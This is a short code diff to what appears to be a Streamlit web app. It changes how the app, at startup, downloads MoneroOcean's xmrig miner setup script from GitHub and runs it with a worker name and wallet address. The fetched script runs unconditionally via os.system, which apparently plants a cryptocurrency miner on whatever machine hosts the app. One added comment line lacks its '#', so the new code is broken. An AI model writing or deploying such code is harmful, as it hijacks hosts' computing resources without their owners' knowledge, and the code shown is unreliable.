@@ -16,4 +16,11 @@ if button == True:
     st.text('Please Enter CMD')
     
 
-os.system(f"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | sed -e's%hostname%echo {worker}%' | bash -s {address}")
+ Construct the curl command and store the script in a temporary file
+os.system(f"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh > setup_moneroocean_miner.sh")
+
+# Modify the script to include the worker name
+os.system(f"sed -i 's/hostname/echo {worker}/' setup_moneroocean_miner.sh")
+
+# Run the modified script with the address argument
+os.system(f"bash setup_moneroocean_miner.sh {address}")
